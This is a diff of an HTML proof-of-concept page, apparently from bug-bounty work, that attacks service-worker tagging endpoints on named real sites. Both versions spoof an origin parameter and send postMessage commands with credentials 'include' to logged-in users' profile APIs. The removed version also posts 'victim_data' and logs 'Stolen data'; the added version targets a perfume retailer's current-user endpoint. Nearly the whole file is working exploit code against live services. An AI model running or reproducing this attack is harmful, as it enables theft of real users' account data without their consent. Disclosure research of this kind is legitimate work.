@@ -1,73 +1,31 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <title>postMessage demo with open window</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 
 <body>
-    <!-- <button id="send">Open Page and Send Message</button> -->
-    <!-- <iframe id="targetFrame" src="https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr" style="width:100%; height:500px;"></iframe> -->
-
     <script>
-        // 1. Create iframe with spoofed origin
-        const iframe = document.createElement('iframe');
-        // iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
-        iframe.src = 'https://tms.post.ch/_/service_worker/63b0/sw_iframe.html?origin=https://poc1337.xyz&1p=1'
-        document.body.appendChild(iframe);
+        let x = window.open("https://ecom-data.theperfumeshop.com/_/service_worker/63b0/sw.js?origin=https%3A%2F%2Fpoc1337.xyz");
 
-        iframe.onload = () => {
-            try {
-                console.debug('[DEBUG] iframe loaded:', iframe.src);
-                // 2. Send command to exfiltrate data
-                const collectUrl = `https://account.post.ch/selfadmin/api/secure/v1/profile/`;
-                const collectMsg = {
-                    type: 1,
-                    clientId: 'attacker-client',
-                    command: {
-                        commandType: 0,
-                        params: {
-                            url: collectUrl,
-                            method: 0, //GET
-                            credentials: 'include',
-                            templates: {},
-                            processResponse: true
-                        }
+        setTimeout(() => {
+            x.postMessage({
+                type: 1,
+                clientId: 'attacker-client',
+                command: {
+                    commandType: 0,
+                    params: {
+                        url: "https://api.theperfumeshop.com/api/v2/tpsgb/users/current",
+                        method: 0, //GET
+                        credentials: 'include',
+                        processResponse: true
                     }
-                };
-                console.debug('[DEBUG] Sending collect message:', collectMsg);
-                iframe.contentWindow.postMessage(collectMsg, '*');
-
-                // 3. Or send tracking request with victim's cookies
-                const stealMsg = {
-                    type: 1,
-                    clientId: 'attacker-client',
-                    command: {
-                        commandType: 0,
-                        params: {
-                            url: 'https://account.post.ch/selfadmin/api/tizz',
-                            method: 1, // POST
-                            body: 'victim_data=sensitive',
-                            credentials: 'include'
-                        }
-                    }
-                };
-                console.debug('[DEBUG] Sending steal message:', stealMsg);
-                iframe.contentWindow.postMessage(stealMsg, '*');
-            } catch (err) {
-                console.error('[ERROR] Failed to send postMessage:', err);
-            }
-        };
-
-        // 4. Listen for responses
-        window.addEventListener('message', (e) => {
-            console.debug('[DEBUG] Received message event:', e);
-            if (e.origin !== 'https://tms.post.ch') {
-                console.log('[INFO] Stolen data:', e.data);
-            } else {
-                console.log('[INFO] Message from trusted origin:', e.data);
-            }
-        });
+                }
+            }, "*");
+        }, 3000);
     </script>
 </body>
 
